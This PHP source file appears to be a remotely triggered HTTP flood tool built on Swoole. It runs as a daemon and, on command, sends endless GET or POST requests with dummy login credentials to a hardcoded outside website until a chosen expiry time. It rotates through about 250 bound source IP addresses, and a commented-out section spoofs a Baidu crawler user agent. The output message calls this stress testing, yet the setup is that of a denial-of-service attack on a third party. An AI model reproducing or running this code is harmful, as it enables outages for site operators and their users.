<?php
declare (strict_types=1);
require('./vendor/autoload.php');
require('./Request.php');
//修改当前文件资源上限
shell_exec("ulimit -n 100960");
$http = new \Swoole\Http\Server("0.0.0.0", 8765, SWOOLE_BASE);
$http->on("start", function (\Swoole\Http\Server $server) {
    swoole_set_process_name("test");
    echo "start success!\n";
});
$http->set(['daemonize'=>1]);
$http->on("request", function (\Swoole\Http\Request $request, \Swoole\Http\Response $response) {
    $response->header("Content-Type", "text/plain");
    //$url = (string)$request->get['url'];
    $url='http://www.lnjsxfaqkjyxgs.cn/html/20210331/';
    $url='https://ayxvip1188.com/';
    $action = strtolower((string)$request->get['action']);
    $time=(int)$request->get['time']+time(); //如果这个小于了当前时间表示过期了
    $num=(int)$request->get['num'];
    //$data=urldecode((string)$request->get['data']);
    //$ipArray=array_values(swoole_get_local_ip());
    $data=[
        'username'=>'aaaaaa',
        'password'=>'dddddd',
        'verifyCode'=>2311,
        'gToken'=>''
    ];
    $ipArray=[];
    array_push($ipArray,'45.194.236.122');
    for($i=194;$i<255;$i++){
        array_push($ipArray,'45.192.82.'.$i);
    }
    for($i=66;$i<127;$i++){
        array_push($ipArray,'45.192.95.'.$i);
    }
    for($i=66;$i<127;$i++){
        array_push($ipArray,'45.192.111.'.$i);
    }
    for($i=2;$i<63;$i++){
        array_push($ipArray,'45.192.120.'.$i);
    }
    if ($action != "get" && $action != "post") {
        $response->end("action error");
        return;
    }
    \Swoole\Coroutine::create(function () use ($data,$action,$num,$url,$time,$ipArray) {
        $connectionPool =new \Swoole\ConnectionPool(function () use ($url, $time) {
            //return new Request($url.mt_rand(10000,9999999999).'.html');
            return new Request($url);
        },$num);
        $connectionPool->fill();
        $i=0;
        while (true){
            if($time<time()){
                $connectionPool->close();
                break;
            }
            if($i>=count($ipArray)){
                $i=0;
                sleep(2);
            }
            $request=$connectionPool->get();
            if ($request instanceof Request) {
                \Swoole\Coroutine::create(function()use($data, $action,$connectionPool,$i,$request,$url,$ipArray) {
                    try {
                        if ($action == 'get') {
                            $request->get($ipArray[$i]);
                            /*$saber = \Swlib\Saber::create([
                                'base_uri' =>$url,
                                'headers' => [
                                    'User-Agent' =>'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
                                ],
                                'referer' => 'wocaonimaaaaaaaaaaaaaaaa',
                                'bind_address'=>'104.252.216.194'
                            ]);
                            $saber->get('/');*/
                        } else if($action == 'post') {
                            $request->post($data,$ipArray[$i]);
                        }
                        $connectionPool->put($request);
                    }catch(Exception $e){
                        $connectionPool->put($request);
                    }
                });
            }
            $i++;

        }
    });
    $message = sprintf('stress tests url:%s - thread:%s - expire:%s',$url,$num, date("Y/m/d H:i:s", $time));
    @$response->end((string)$message);
});

$http->start();